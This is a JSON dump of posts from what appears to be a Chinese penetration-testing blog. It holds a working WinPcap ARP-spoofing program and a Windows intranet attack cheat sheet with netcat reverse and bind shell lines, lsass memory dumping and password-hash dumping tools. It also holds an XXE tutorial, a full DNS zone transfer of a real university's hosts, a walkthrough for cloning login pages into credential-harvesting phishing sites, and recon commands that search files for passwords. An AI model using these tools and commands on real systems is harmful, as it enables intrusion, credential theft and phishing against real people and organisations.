\"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;pcap.h&gt;#include &lt;conio.h&gt;#include &lt;packet32.h&gt;#include &lt;ntddndis.h&gt;#include &lt;windows.h&gt;#ifndef MY_ARP_CHEAT_INCLUDE_H#define MY_ARP_CHEAT_INCLUDE_H//字节对齐必须是1#pragma pack (1)struct ethernet_head&#123; unsigned char dest_mac[6]; //目标主机MAC地址 unsigned char source_mac[6]; //源端MAC地址 unsigned short eh_type; //以太网类型&#125;;struct arp_head&#123; unsigned short hardware_type; //硬件类型：以太网接口类型为1 unsigned short protocol_type; //协议类型：IP协议类型为0X0800 unsigned char add_len; //硬件地址长度：MAC地址长度为6B unsigned char pro_len; //协议地址长度：IP地址长度为4B unsigned short option; //操作：ARP请求为1，ARP应答为2 unsigned char sour_addr[6]; //源MAC地址：发送方的MAC地址 unsigned long sour_ip; //源IP地址：发送方的IP地址 unsigned char dest_addr[6]; unsigned long dest_ip; unsigned char padding[18];&#125;;struct arp_packet //最终arp包结构&#123; ethernet_head eth; //以太网头部 arp_head arp; //arp数据包头部&#125;;#pragma pack ()unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned char* dest_mac, unsigned long src_ip, unsigned long dest_ip);#endifint main(void)&#123; char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区 int times; // 发送次数 int i = 0; unsigned char *packet; //ARP包 pcap_t *adhandle; //一个pcap实例 pcap_if_t *alldevs; // 全部网卡列表 pcap_if_t *device; // 一个网卡 int inum; // 用户选择的网卡序号 // 获得本机网卡列表 if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &amp;alldevs, errbuf) == -1) &#123; fprintf(stderr, \"Error in pcap_findalldevs: %s\\n\", errbuf); exit(1); &#125; // 打印网卡列表 for (device = alldevs; device; device = device-&gt;next) &#123; printf(\"%d\", ++i); if (device-&gt;description) printf(\". %s\\n\", device-&gt;description); else printf(\". No description available\\n\"); &#125; // 如果没有发现网卡 if (i == 0) &#123; printf(\"\\nNo interfaces found! Make sure WinPcap is installed.\\n\"); return -1; &#125; // 请用户选择一个网卡 printf(\"Enter the interface number (1-%d):\", i); scanf_s(\"%d\", &amp;inum); // 移动指针到用户选择的网卡 for (device = alldevs, i = 0; i&lt; inum - 1; device = device-&gt;next, i++); char chs_src_ip[16] = &#123;0&#125;; char chs_dest_ip[16] = &#123;0&#125;; unsigned long ul_src_ip = 0u; unsigned long ul_dest_ip = 0u; getchar(); printf(\"Input the src ip(192.168.1.1):\"); gets_s(chs_src_ip); ul_src_ip = inet_addr(chs_src_ip); printf(\"Input the dest ip(192.168.1.100):\"); gets_s(chs_dest_ip); ul_dest_ip = inet_addr(chs_dest_ip); unsigned char uchs_src_mac[10] = &#123; 0 &#125;; unsigned char uchs_dest_mac[10] = &#123; 0 &#125;; printf(\"Input source mac address(30 AD 23 A3 FC CD):\"); scanf_s(\"%x%x%x%x%x%x\", &amp;uchs_src_mac[0], &amp;uchs_src_mac[1], &amp;uchs_src_mac[2], &amp;uchs_src_mac[3], &amp;uchs_src_mac[4], &amp;uchs_src_mac[5]); printf(\"Input dest mac address(30 AD 23 A3 FC CD):\"); scanf_s(\"%x%x%x%x%x%x\", &amp;uchs_dest_mac[0], &amp;uchs_dest_mac[1], &amp;uchs_dest_mac[2], &amp;uchs_dest_mac[3], &amp;uchs_dest_mac[4], &amp;uchs_dest_mac[5]); printf(\"Input send times:\"); scanf_s(\"%d\", &amp;times); packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip); /* 打开网卡 */ if ((adhandle = pcap_open(device-&gt;name, // name of the device 65536, // portion of the packet to capture 0, //open flag 1000, // read timeout NULL, // authentication on the remote machine errbuf // error buffer )) == NULL) &#123; fprintf(stderr, \"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", device-&gt;name); /* Free the device list */ pcap_freealldevs(alldevs); return -1; &#125; //构建假的ARP请求包，达到本机伪装成给定的IP地址的目的 packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip); int j = 1; while (j &lt;= times) &#123; pcap_sendpacket(adhandle, packet, 60); Sleep(100); printf(\"%d:%s--&gt;%s\\n\",j, chs_src_ip,chs_dest_ip); j++; &#125; printf(\"end!!!\\n\"); getchar(); return 0;&#125;unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned char* dest_mac, unsigned long src_ip, unsigned long dest_ip)&#123; static struct arp_packet packet; memcpy(packet.eth.dest_mac, dest_mac, 6); memcpy(packet.eth.source_mac, source_mac, 6); packet.eth.eh_type = htons(0x0806); packet.arp.hardware_type = htons(0x0001); packet.arp.protocol_type = htons(0x0800); packet.arp.add_len = 0x06; packet.arp.pro_len = 0x04; packet.arp.option = htons(0x0002); memcpy(packet.arp.sour_addr, source_mac, 6); packet.arp.sour_ip = src_ip; memcpy(packet.arp.dest_addr, dest_mac, 6); packet.arp.dest_ip = dest_ip; memset(packet.arp.padding, 0, 18); return (unsigned char*)&amp;packet;&#125;","categories":[],"tags":[{"name":"ARP欺骗","slug":"ARP欺骗","permalink":"http://www.evilclay.com/tags/ARP欺骗/"}]},{"title":"Windows内网渗透常用工具命令速记","slug":"Windows内网渗透常用工具命令速记","date":"2016-10-27T15:36:24.000Z","updated":"2016-10-27T16:20:04.278Z","comments":true,"path":"2016/10/27/Windows内网渗透常用工具命令速记/","link":"","permalink":"http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/","excerpt":"","text":"建立 IPC 连接（需要139 or 445 端口）： net use \\\\ip\\ipc$ /user:username password net use \\\\ip\\ipc$ /del // 关闭与 IP 已经建立的 IPC 连接 net use z: \\\\ip\\C$ // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘 copy c:\\123.txt \\\\ip\\C$\\111\\ // 把本地 123.txt 复制到对方 C 盘 111 目录下 net view \\\\ip // 显示远程主机的共享 net share // 查看本地已开启的共享 net share ipc$ // 本机开启 IPC 服务 AT 计划任务： net time \\\\ip // 查看 远程 IP 上的系统时间 at \\\\ip 时间 程序名 or 系统命令 PsExec : PsExec \\\\&lt;ip&gt; -u user -p pass cmd PwDump: pwdump7.exe (Dump system passwords) pwdump7.exe -s (Dump passwords from files) pwdump7.exe -d [sourcefile] [destionation] (Copy filename to destionation) // 可以复制进程调用的文件 pwdump7.exe -h (Show this help) pwdump6.exe -x &lt;dst_ip&gt; // 需要与 dst_ip 建立 IPC 通道，而且是pwdump6版本有这个功能 NC: nc 192.168.1.1 5678 连接.100的5678端口 nc -vv -lp 22222 -t -e cmd.exe 监听本地22222端口并反弹CMD nc -vv -lp 23333 // 监听 本地23333端口 nc 192.16.1.1 23333 -t -e cmd // 连接远程23333端口并绑定 CMD GetPass: // 闪电小子 根据 minikatz 编译的工具，分为32位和64位，可以直接过去明文密码。 QuarksPwDump // 支持 Windows XP / 2003 / Vista / 7 / 2008 / 8 QuarksPwDump.exe -dhl // 抓取本地 hash QuarksPwDump.exe -k // 获得系统秘钥 ProcDump： // lsass.exe 是Windows安全策略，权威域认证，AD管理的关键组件 procdump.exe -accepteula -ma lsass.exe lsass.dmp // 下载内存文件到本地 IPC批处理爆破： ipc_crack.bat IP Username Passwordfile.txt hscan： hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -ftp // 使用FTP弱点模块探测 hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -all // 加载所有弱点模块探测 ftpscan： ftpscan.exe &lt;start_ip&gt;-&lt;end_ip&gt; 200 // 开启200线程扫描制定 IP 段 // 使用的是默认字典 username.dic password.dic Port2Port： Port2Port.exe 2333 &lt;ip&gt; port // 把 本地 2333 端口转发到 远程 port 铁鹰PortTransfer： PortTransfer.exe -listen &lt;本地 监听端口&gt; &lt;本地 反弹端口&gt; PortTransfer.exe -remote &lt;远程 IP&gt; &lt;远程 端口&gt; 127.0.0.1 &lt;本地 监听端口&gt; Fpipe: 在跳板机上运行：fpipe -l 81 -r 22 &lt;远程IP&gt; //把 远程IP 的 22 端口映射到跳板机 81端口，默认使用高端口转发流量。 或者： 在跳板机上运行：fpipe -l 81 -s 82 -r 22 &lt;远程IP&gt; //把 远程IP 的 22 端口映射到跳板机 81端口，并且指定82端口来转发流量。 Htran: HTran2.4.exe -p -Listen 11111 22222 // 攻击端 IP 执行 // 开启 11111 22222 端口 并把 11111 的流量转发给 22222 HTran2.4.exe -p -slave &lt;攻击端 IP&gt; 11111 127.0.0.1 3389 // 被攻击端IP 执行 // 把 本地 3389 端口转发到 攻击机 的 11111端口 目前整理了这些工具，定会疏漏，欢迎大黑牛告诉小弟，我来补充下~","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.evilclay.com/tags/安全工具/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.evilclay.com/tags/内网渗透/"}]},{"title":"XML外部实体注入（XXE）漏洞分析及漏洞场景探索","slug":"XML外部实体注入（XXE）漏洞分析及漏洞场景探索","date":"2016-10-11T15:16:07.000Z","updated":"2016-10-13T15:57:53.126Z","comments":true,"path":"2016/10/11/XML外部实体注入（XXE）漏洞分析及漏洞场景探索/","link":"","permalink":"http://www.evilclay.com/2016/10/11/XML外部实体注入（XXE）漏洞分析及漏洞场景探索/","excerpt":"","text":"闲扯发呆这种事情真的有毒，想到3年前一个前辈问我的一个技术问题，当你拿到一个非 ROOT 权限的注入点后，如何获得 系统的 ROOT/SYSTEM 权限，实话说，到今天我依然回答不出来一个我想要的答案，突然间一种技术止步不前的危机感，实在惶恐(惶恐是因为明明刚入门的骚年就有这种感觉了，可怕)，就在不久前的一次ShowCase上，牛叉的 no 老师在提权这块给我一些实用的思路，回想起来有以下三种方法： 查看 系统内的 补丁安装情况，以及安装了那些软件或者组件，利用系统或者软件本身的漏洞使用对用的 EXP 进行提权操作。 手机数据库以及可接触到的文件各种账户信息（Web后台账户，DB账户），分析邮件，密码规则，对高权限的账户进行 Fuzz。 针对不同的数据库（SQLServer，MySQL，Oracle）使用不同的提权技巧，比如 SQLServer，可以利用有写日志权限的账户把新建administrator权限的账户代码写入到.hta后缀的日志中，把该日志文件放到系统的启动项文件夹，当系统重启的时候自动会给你创建系统权限的账户。 针对上面的三条依然停留在概念阶段，由其是第三条被动提权的方式一定很好玩，准备过两周对提权这块好好研究研究。在这里Mark一下。 对于渗透测试有一种见一种打一套的感觉，尤其是听了 No 老师的分享之后，也就觉得技能反而没这么重要了，重要的是实战经验。多 x 站，多分析，以后遇到某种情况心中自然满是套路，23333. 有一种阅片无数心中自然无码的感觉，哦不对，是胸有成竹的感觉: ) 所谓套路就是就是一些正常打法，就像解一道数学题一样，咱们一步一步来，这步走不通或者解法十分复杂就换一个切入段使用第二种解法。不错，这很 Nice。如果心中自有方圆，一套一套的打下去估计也该心满意足了。 谈到猥琐流，卧槽，牛逼啊，能猥琐说明了咱已经熟练的掌握了正规的打法，也就是所谓的套路，不然连一个正常的套路都打不出来的话又何谈猥琐呢？ 所以说： 要想猥琐，先学套路！ 要想猥琐，先学套路！ 要想猥琐，先学套路！ 闲扯了这些，没啥卵用，但就是想扯，毕竟我有点控计不住我子鸡了。 下面步入正题，这周看了下 XXE 相关的文章，最终目的很简单，就是想看看 XXE 的漏洞该怎么去挖，在一步步走向终点的过程中，会学习什么是 XXE，XXE 漏洞对应代码/程序的使用场景，以及为什么会出现XXE。 XXE（XML外部实体注入）是针对于使用 XML 交互的Web应用程序攻击方法，是一种服务端攻击方式。Web程序（PHP，Java，Python）在解析不安全的 XML 的文件的时候由于没有正确的安全效验导致 XXE 的产生。又应证了一句话，”All inputs are EVAL!”，所以说漏洞出现的地方就是用到了XML方式交互数据的地方。 什么是 XML External Entity一般来说，XML 是一种用来定义数据的一种文件格式，类似于 JSON，倒是近些年由于基于 API 开发的盛行，使用 JSON 作为前后端数据交换的格式火了起来。一般的 XML 文件格式如下： &lt;worker&gt; &lt;name&gt;Anka9080&lt;/name&gt; &lt;slogan&gt;PPAP&lt;/slogan&gt; &lt;/worker&gt; 一个完整的 XML 文件应该包含 XML声明(可选)，文档类型定义（可选），文档元素三个部分。 DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 如图所示 DTD 是在文档内声明，若外部声明 DTD 需要以 SYSTEM 或者 PUBLIC 作为关键字进行声明： &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 或者： &lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt; DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明使用 &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部声明同样使用 SYSTEM 或者 PUBLIC 关键字： &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 或者 &lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 什么是 XXE注入通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害，有一种 SSRF 的Feel~ 引入外部实体的方式有很多种，如下： 直接引入本地文件","categories":[],"tags":[{"name":"XXE","slug":"XXE","permalink":"http://www.evilclay.com/tags/XXE/"},{"name":"闲扯","slug":"闲扯","permalink":"http://www.evilclay.com/tags/闲扯/"}]},{"title":"DNS服务器探测及DNS区域传送","slug":"DNS服务器探测及DNS区域传送","date":"2016-10-10T01:09:51.000Z","updated":"2016-10-10T01:11:19.091Z","comments":true,"path":"2016/10/10/DNS服务器探测及DNS区域传送/","link":"","permalink":"http://www.evilclay.com/2016/10/10/DNS服务器探测及DNS区域传送/","excerpt":"","text":"DNS 枚举 NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析MX记录 记录邮件服务器的IP地址 1命令 dnsenum foo.com 用来定位 DNS 服务器 以及 邮件服务器。 在主备服务器之间同步数据库，需要使用“DNS域传送” DNS 域传送漏洞就是 向存在漏洞的DNS服务器发送请求，会返回某个域的所有记录，造成网络拓扑被泄露的危险。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164root@EvilCLAY:~# dnsenum tjut.edu.cndnsenum.pl VERSION:1.2.3----- tjut.edu.cn -----Host's addresses:__________________Name Servers:______________dns1.tjut.edu.cn. 3600 IN A 59.67.148.5dns.tjut.edu.cn. 3600 IN A 202.113.64.3Mail (MX) Servers:___________________mail.tjut.edu.cn. 57168 IN A 59.67.148.8Trying Zone Transfers and getting Bind Versions:_________________________________________________Trying Zone Transfer for tjut.edu.cn on dns1.tjut.edu.cn ... AXFR record query failed: RCODE from server: REFUSEDTrying Zone Transfer for tjut.edu.cn on dns.tjut.edu.cn ... tjut.edu.cn. 86400 IN SOA tjut.edu.cn.tjut.edu.cn. 86400 IN NS dns.tjut.edu.cn.tjut.edu.cn. 86400 IN NS dns1.tjut.edu.cn.tjut.edu.cn. 86400 IN MX 10acm.tjut.edu.cn. 86400 IN A 59.67.152.15ccs.tjut.edu.cn. 86400 IN A 59.67.148.196ceping.tjut.edu.cn. 86400 IN A 202.113.65.3ChinaSecEdu2012.tjut.edu.cn. 86400 IN A 59.67.152.66chinese.tjut.edu.cn. 86400 IN A 202.113.64.2clsyzx.tjut.edu.cn. 86400 IN A 202.113.64.2cs.tjut.edu.cn. 86400 IN A 59.67.152.3cstp.tjut.edu.cn. 86400 IN A 202.113.65.25dns.tjut.edu.cn. 86400 IN A 202.113.64.3dns1.tjut.edu.cn. 86400 IN A 59.67.148.5dpstar.tjut.edu.cn. 86400 IN A 59.67.148.196eie.tjut.edu.cn. 86400 IN A 202.113.64.2englishzs.tjut.edu.cn. 86400 IN A 202.113.64.2gcxl.tjut.edu.cn. 86400 IN A 59.67.148.89gjjl.tjut.edu.cn. 86400 IN A 202.113.64.2gmis.tjut.edu.cn. 86400 IN A 59.67.148.92gzc.tjut.edu.cn. 86400 IN A 202.113.64.50ha.tjut.edu.cn. 86400 IN A 202.113.64.2hqc.tjut.edu.cn. 86400 IN A 202.113.64.2hr.tjut.edu.cn. 86400 IN A 59.67.148.196huagong.tjut.edu.cn. 86400 IN A 202.113.64.2itil.tjut.edu.cn. 86400 IN A 59.67.148.196itil.tjut.edu.cn. 86400 IN A 59.67.148.197jbg.tjut.edu.cn. 86400 IN A 202.113.64.2jbw.tjut.edu.cn. 86400 IN A 202.113.64.2jcw.tjut.edu.cn. 86400 IN A 202.113.64.2jgdw.tjut.edu.cn. 86400 IN A 202.113.64.2jgh.tjut.edu.cn. 86400 IN A 202.113.64.2jgz.tjut.edu.cn. 86400 IN A 202.113.64.2jj.tjut.edu.cn. 86400 IN A 202.113.64.2jjc.tjut.edu.cn. 86400 IN A 202.113.64.2jlt.tjut.edu.cn. 86400 IN A 202.113.64.2jsjch.tjut.edu.cn. 86400 IN A 202.113.64.2jtw.tjut.edu.cn. 86400 IN A 202.113.64.2jtz.tjut.edu.cn. 86400 IN A 202.113.64.2jw.tjut.edu.cn. 86400 IN A 202.113.64.2jwgl.tjut.edu.cn. 86400 IN A 59.67.148.195jwgl.tjut.edu.cn. 86400 IN A 59.67.148.201jwgl.tjut.edu.cn. 86400 IN A 59.67.148.202jy.tjut.edu.cn. 86400 IN A 59.67.148.217jyweb.tjut.edu.cn. 86400 IN A 59.67.148.217jyzx.tjut.edu.cn. 86400 IN A 59.67.148.65jzz.tjut.edu.cn. 86400 IN A 202.113.64.2kczx.tjut.edu.cn. 86400 IN A 59.67.148.86kjc.tjut.edu.cn. 86400 IN A 202.113.64.2kygl.tjut.edu.cn. 86400 IN A 172.16.100.58lib.tjut.edu.cn. 86400 IN A 202.113.68.3idp.lib.tjut.edu.cn. 86400 IN A 202.113.68.153libm.tjut.edu.cn. 86400 IN A 202.113.68.12lx.tjut.edu.cn. 86400 IN A 59.67.148.217lxszs.tjut.edu.cn. 86400 IN A 202.113.64.2lxy.tjut.edu.cn. 86400 IN A 202.113.64.2lxyz.tjut.edu.cn. 86400 IN A 202.113.64.2mail.tjut.edu.cn. 86400 IN A 59.67.148.8mater.tjut.edu.cn. 86400 IN A 202.113.64.2mconsole.tjut.edu.cn. 86400 IN A 59.67.148.218me.tjut.edu.cn. 86400 IN A 202.113.64.2mfile.tjut.edu.cn. 86400 IN A 59.67.148.218mobileapp.tjut.edu.cn. 86400 IN A 59.67.148.218ms.tjut.edu.cn. 86400 IN A 59.67.157.162ms.tjut.edu.cn. 86400 IN A 202.113.64.2my.tjut.edu.cn. 86400 IN A 59.67.148.196my.tjut.edu.cn. 86400 IN A 59.67.148.197nem.tjut.edu.cn. 86400 IN A 202.113.64.2news.tjut.edu.cn. 86400 IN A 202.113.64.2*.org.tjut.edu.cn. 86400 IN A 202.113.65.230pay.tjut.edu.cn. 86400 IN A 59.67.148.196pay.tjut.edu.cn. 86400 IN A 59.67.148.197portal.tjut.edu.cn. 86400 IN A 59.67.148.196rsc.tjut.edu.cn. 86400 IN A 202.113.64.2rzjf.tjut.edu.cn. 86400 IN A 192.168.9.2sclc.tjut.edu.cn. 86400 IN A 202.113.64.2shadu.tjut.edu.cn. 86400 IN A 59.67.148.6sjjx.tjut.edu.cn. 86400 IN A 59.67.148.211ssfw.tjut.edu.cn. 86400 IN A 59.67.148.195ssfw.tjut.edu.cn. 86400 IN A 59.67.148.201stud.tjut.edu.cn. 86400 IN TXT v=spf1stud.tjut.edu.cn. 86400 IN MX 5stud.tjut.edu.cn. 86400 IN MX 10_dmarc.stud.tjut.edu.cn. 86400 IN TXT v=DMARC1mail.stud.tjut.edu.cn. 86400 IN CNAME mailhz.qiye.163.com.pop.stud.tjut.edu.cn. 86400 IN CNAME pophm.qiye.163.com.smtp.stud.tjut.edu.cn. 86400 IN CNAME smtphm.qiye.163.com.study.tjut.edu.cn. 86400 IN A 59.67.152.62tccce.tjut.edu.cn. 86400 IN A 202.113.64.2tjedu.tjut.edu.cn. 86400 IN A 202.113.65.21tsgvirt.tjut.edu.cn. 86400 IN A 202.113.68.27tyb.tjut.edu.cn. 86400 IN A 202.113.64.2vpn.tjut.edu.cn. 86400 IN A 59.67.148.6www.tjut.edu.cn. 86400 IN A 202.113.64.2www1.tjut.edu.cn. 86400 IN A 202.113.64.7xcb.tjut.edu.cn. 86400 IN A 202.113.64.2xg.tjut.edu.cn. 86400 IN A 59.67.148.196xg.tjut.edu.cn. 86400 IN A 59.67.148.197xgb.tjut.edu.cn. 86400 IN A 202.113.64.2xhjj.tjut.edu.cn. 86400 IN A 202.113.64.2xk.tjut.edu.cn. 86400 IN A 59.67.148.195xk.tjut.edu.cn. 86400 IN A 59.67.148.200xk.tjut.edu.cn. 86400 IN A 59.67.148.201xk.tjut.edu.cn. 86400 IN A 59.67.148.202xny.tjut.edu.cn. 86400 IN A 202.113.64.2xxgk.tjut.edu.cn. 86400 IN A 202.113.64.2xxs.tjut.edu.cn. 86400 IN A 202.113.64.2yda.tjut.edu.cn. 86400 IN A 202.113.64.2yfz.tjut.edu.cn. 86400 IN A 202.113.64.2yhy.tjut.edu.cn. 86400 IN A 202.113.64.2yjs.tjut.edu.cn. 86400 IN A 202.113.64.2yjsjx.tjut.edu.cn. 86400 IN A 59.67.148.92yjy.tjut.edu.cn. 86400 IN A 202.113.64.2yktcx.tjut.edu.cn. 86400 IN A 59.67.148.40yktcz.tjut.edu.cn. 86400 IN A 59.67.148.73ylr.tjut.edu.cn. 86400 IN A 202.113.64.2yx.tjut.edu.cn. 86400 IN A 59.67.148.217yxh.tjut.edu.cn. 86400 IN A 202.113.64.2yys.tjut.edu.cn. 86400 IN A 202.113.64.2yyy.tjut.edu.cn. 86400 IN A 202.113.64.2zdh.tjut.edu.cn. 86400 IN A 202.113.64.2zgc.tjut.edu.cn. 86400 IN A 202.113.64.2zs.tjut.edu.cn. 86400 IN A 59.67.148.217zsb.tjut.edu.cn. 86400 IN A 202.113.64.2ztjy.tjut.edu.cn. 86400 IN A 202.113.64.2zxzf.tjut.edu.cn. 86400 IN A 202.113.66.34zzdy.tjut.edu.cn. 86400 IN A 59.67.148.200zzdy.tjut.edu.cn. 86400 IN A 59.67.148.202zzfw.tjut.edu.cn. 86400 IN A 59.67.148.195zzfw.tjut.edu.cn. 86400 IN A 59.67.148.201brute force file not specified, bay.","categories":[],"tags":[{"name":"DNS区域传送","slug":"DNS区域传送","permalink":"http://www.evilclay.com/tags/DNS区域传送/"}]},{"title":"Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站","slug":"Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站","date":"2016-10-02T16:22:06.000Z","updated":"2016-10-02T17:14:26.388Z","comments":true,"path":"2016/10/03/Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站/","link":"","permalink":"http://www.evilclay.com/2016/10/03/Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站/","excerpt":"","text":"Social-Engineer-Tool 是一个好工具，使用 Python 开发，准备后期深入的挖掘一下，今天俺要拿它的克隆网站功能制作一个钓鱼网站看看效果咋样~ 一、安装最新版 SET 工具 从 GitHub上下载最近的安装包并解压(20161003最新是7.3.16版本) https://github.com/trustedsec/social-engineer-toolkit/releases 执行 sudo python setup.py install 会安装 SET 以及相关的依赖工具。 二、克隆网站 使用 sudo setoolkit 打开 SET 工具 主菜单选择社会工程学攻击 2 因为要做钓鱼攻击，选择3 这一步选择钓鱼页面的生成方式，选择从指定的网站克隆钓鱼页面 2 这一步设定钓鱼服务器的 IP 以及需要克隆的页面 URL 地址，我这里使用本机(192.168.1.105)直接作为钓鱼服务器。 设置好之后会在 钓鱼服务器的 Web 根目录下直接生成钓鱼页面，如下所示: html 文件 和 PHP 文件都是用来钓鱼的页面，havester 开头的文件是用来接收用户输入的账户信息，看一下文件的内容： index.html 内容： 可以看出 把 form 的action 改成 钓鱼网站的接收地址。 post.php 内容： 就是接收 POST 参数，然后把 POST数据写到文件里。 三、测试效果 先看需要钓鱼的真实网站： 是一个简单的 登录 界面。 使用 SET 工具 克隆后的钓鱼网站页面： 可以看出 克隆出来的网站除了图标没有意外其他和真实网站一模一样，话说这个SET做钓鱼页面简直省心省力，赞！ 在钓鱼页面输了一个账户，密码测试后，钓鱼服务器接收的账户信息： 随手 克隆了一个FreeBuf 的登录界面，发现克隆出来的效果还是很理想的，左边是 FB 的 右边是克隆出的页面 :) 参考:https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdfhttp://www.freebuf.com/sectool/73409.html","categories":[],"tags":[{"name":"社工工程学","slug":"社工工程学","permalink":"http://www.evilclay.com/tags/社工工程学/"},{"name":"钓鱼网站","slug":"钓鱼网站","permalink":"http://www.evilclay.com/tags/钓鱼网站/"},{"name":"SET","slug":"SET","permalink":"http://www.evilclay.com/tags/SET/"}]},{"title":"Windows内网提权命令收集","slug":"Windows内网提权命令收集","date":"2016-09-26T17:07:24.000Z","updated":"2016-09-29T14:50:02.256Z","comments":true,"path":"2016/09/27/Windows内网提权命令收集/","link":"","permalink":"http://www.evilclay.com/2016/09/27/Windows内网提权命令收集/","excerpt":"","text":"一、系统信息查看系统的各种信息 systeminfo // 结果返回OS的名称，版本，系统安装时间，启动时间，CPU位数，CPU个数，频率，系统目录，内存大小，安装了多少补丁，网卡 systeminfo | findstr /B /C:&quot;OS 名称&quot; // 过滤输出 系统名称 // findstr /B 从行的开始进行匹配 /C: 表示匹配字符串 识别系统体系架构 echo %PROCESSOR_ARCHITECTURE% 查看所有系统环境变量 SET 查看用户的信息 net user xxx 二、网络信息路由信息 route print // 查看内网的route信息 查看 ARP 缓存表 arp -a 查看所有的网络连接 netstat -ano 三、应用程序信息查看计划任务 chcp 437 // 中文系统需要先设置成美国编码 schtasks /QUERY /fo LIST /v 查看服务进程PID tasklist /SVC // 在任务资源管理器页面也可以设置查看 查看安装的驱动 DRIVERQUERY 查看安装的程序以及版本信息 wmic product list brief // 作为漏洞利用线索 // 在控制面板-卸载程序界面也可以看到相关信息 查看服务，进程，启动程序相关信息 wmic service list brief wmic process list brief wmic startup list brief 查看安装的补丁和时间信息 wmic qfe get Caption,Description,HotFixID,InstalledOn 查看特定漏洞的补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot; 四、 敏感数据文件dir /b/s config* // 当前目录下查找所有文件以config开头的文件 findstr /si password *.xml *.ini *.txt 当前目录下在指定的文件类型中查找指定的字符串 参考http://www.freebuf.com/articles/system/114731.html","categories":[],"tags":[{"name":"内网提权","slug":"内网提权","permalink":"http://www.evilclay.com/tags/内网提权/"},{"name":"Windows运维","slug":"Windows运维","permalink":"http://www.evilclay.com/tags/Windows运维/"}]},{"title":"12306 余票查询小助手","slug":"12306-余票查询小助手","date":"2016-09-25T01:55:05.000Z","updated":"2016-09-25T02:10:40.209Z","comments":true,"path":"2016/09/25/12306-余票查询小助手/","link":"","permalink":"http://www.evilclay.com/2016/09/25/12306-余票查询小助手/","excerpt":"","text":"本程序循环访问 12306 网站，不停的刷新页面，直到发现配置文件中预定的车次有余票时发送提示邮件并结束程序。 脚本分析 共有两个 py 文件 12306.py // 程序的入口文件 config.py // 程序的配置文件 12306.py 的内容 在这个文件需要配置发送邮件用到的发件人账户和授权码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105# coding:utf-8# 刷票助手 v0.1import ssl,urllib2import jsonimport smtplibimport timeimport datetimefrom email.mime.text import MIMETextfrom email.utils import parseaddr, formataddrfrom email.header import Headerfrom config import *# trains = ['G345','G1905']seat_dict = &#123; '二等座':'ze_num', '硬卧':'yw_num', '硬座':'yz_num'&#125;seat_name = ''# 根据输入判断选择的座位类型def select_seat(): global seat_name if seat_type in seat_dict.keys(): seat_name = seat_dict[seat_type]\"\"\" 请求页面判断指定的车次是否有指定座位\"\"\"def refresh(): global seat_name # url = 'https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-06&amp;from_station=OXH&amp;to_station=HFH' # r = requests.get(url) req = urllib2.Request(url) gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1) html = urllib2.urlopen(req, context=gcontext).read() # print html print '&gt; &#123;&#125; refrash ...'.format(datetime.datetime.now()) html_dict = json.loads(html) # print html_dict datas = html_dict['data']['datas'] for data in datas: if data['station_train_code'] in trains: # if data['station_train_code']: # ze_num 表示二等座 if data[seat_name] != u'无' and data[seat_name] != u'--': print data print '[+] Congratulations!' msg = 'Great Shoot, 火车:&#123;&#125; 去登录官网瞅瞅吧!'.format(data['station_train_code']) send_email(msg,email) return 1 return 0\"\"\" 使用 smtp.qq.com 服务器 来发送邮件\"\"\"def send_email(info,to_addr): msg = MIMEText(info, 'html', 'utf-8') #输入Email地址和口令: from_addr = 'xxxxx@foxmail.com' // 账户 password = 'xxxxxx' // 授权码 # 输入SMTP服务器地址: smtp_server = 'smtp.qq.com' # 输入收件人地址: to_addr = to_addr msg['From'] = _format_addr(u'抢火车票 小助手 &lt;%s&gt;' % from_addr) msg['To'] = _format_addr(u'你好 &lt;%s&gt;' % to_addr) msg['Subject'] = Header(u'Hello, 已经成功捕获一只小白兔 ~', 'utf-8').encode() server = smtplib.SMTP(smtp_server, 25) # 连接 SMTP服务器 端口 server.starttls() # 使用SSL加密方式传输数据 server.set_debuglevel(0) # 打印出和SMTP服务器交互的所有信息 